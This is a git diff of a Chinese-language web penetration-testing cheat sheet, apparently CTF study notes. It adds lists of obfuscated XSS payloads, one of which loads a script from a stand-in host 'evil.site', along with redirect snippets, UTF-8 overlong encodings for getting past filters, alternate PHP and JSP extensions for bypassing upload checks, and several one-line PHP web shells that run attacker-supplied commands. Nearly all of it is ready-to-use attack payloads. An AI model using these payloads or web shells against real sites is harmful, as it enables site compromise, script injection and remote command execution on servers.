@@ -99,6 +99,40 @@ powershell -ExecutionPolicy Bypass -File admin_login.ps1
 <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
 
 <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+
+
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+<script x>alert('XSS')<script y>
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+＜script/src=//evil.site/poc.js＞
+javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' //8进制
+
+// UTF-8绕过特殊字符过滤
+// < = %C0%BC = %E0%80%BC = %F0%80%80%BC
+// > = %C0%BE = %E0%80%BE = %F0%80%80%BE
+// ' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
+// " = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
+// " = %CA%BA
+// ' = %CA%B9
+
+// jsfuck 绕过 [][(![]+[])[+[]]+([![]]+[……
+
+<script>alert(document.domain.concat("\n").concat(window.origin))</script>
 ```
 
 ## 目录穿越
@@ -192,7 +226,7 @@ POST /xxx?p=php://input HTTP/1.1
 
 绕过思路
 ```
-php://filter//convert.iconv.UCS-4*/resource=/var/www/html/flag.php
+php://filter/convert.iconv.UCS-4*/resource=/var/www/html/flag.php
 php://filter/string.rot13/resource=flag.php
 php://filter/zlib.deflate/resource=flag.php
 ```
@@ -365,9 +399,32 @@ Submit!
 2. 文件名后加空格或`.`或`::$DATA`或`/.`或`/xxx/..`
 3. 双写，如 `.pphphp`
 4. 使用短标签，如 `<?=eval($_POST['cmd']);?>`
+5. 后缀替换
+```
+.php3
+.php5
+# Less known PHP extensions
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.inc
+
+.jsp
+.jspx
+.jsw
+.jsv
+.jspf
+.wss
+.do
+.actions
+```
 后端拦截常规处理：
 1. 修改MIME-Type
-2. 改文件内容，头部加上 `GIF89a;`
+2. 改文件内容，头部加上 `GIF87a` 或 `GIF8;`
 3. 制作图片马
 只能上传图片：
 1. 上传 `.user.ini` 强制解析图片内容，使用 `auto_prepend_file=a.jpg` 或 `auto_append_file=a.jpg`
@@ -377,6 +434,58 @@ webdav上传：[[11 安全工具#davtest|davtest]]
 ```
 con=<?php+@system($_GET['cmd']);+?>&file=shell.php/.
 ```
+
+**总结**
+
+- 客户端（前端）验证：无影响
+
+- 服务端（后端）验证
+
+    - 检查filename后缀
+
+        - 黑名单
+
+            - 关联扩展名`php3` `php4` `php5` `phtml`
+            - 大小写 `PHp` 
+            - 双写 `pphphp` `.p.phphp`
+            - 加空格 `php ` 等
+            - 加点 `php.` `php..` 等
+            - 目录相关 `php/.` `php/x/..` 等
+            - Apache配置文件 `.htaccess`
+            - PHP运行时配置文件 `.user.ini`
+            - NTFS文件系统特殊标记 `::$DATA`
+
+        - 白名单
+
+            - 00截断：POST请求参数需要URL decode
+            - 单独的文件名参数改为数组形式，如 `['demo.php','.','jpg']`
+
+    - 检查Content-Type：Mime白名单
+
+    - 检查内容
+
+        - 检查前几个字节（CRLF：0d 0a）
+        
+            - jpg `FF D8`
+            - png `89 50`
+            - gif `47 49 46`
+
+        - 关键字黑名单
+
+            - 短标签绕过php `<?=eval($_GET['cmd']);?>`
+
+            - 大小写绕过eval  `<?php EvaL($_GET['cmd']); ?>`
+
+            - 参数0传递assert `<?php $_GET[0]($_POST[1]); ?>`
+
+    - 其它逻辑
+
+        - 二次渲染：向GIF中插入木马，多试几次
+
+        - 条件竞争：并发处理不当或操作顺序设计不合理时，可以利用时间差访问（结合写入，可能还需要文件包含漏洞）
+
+- 上传图片马：结合文件包含利用
+
 ## SSRF
 服务端请求伪造
 对内网影响比较大
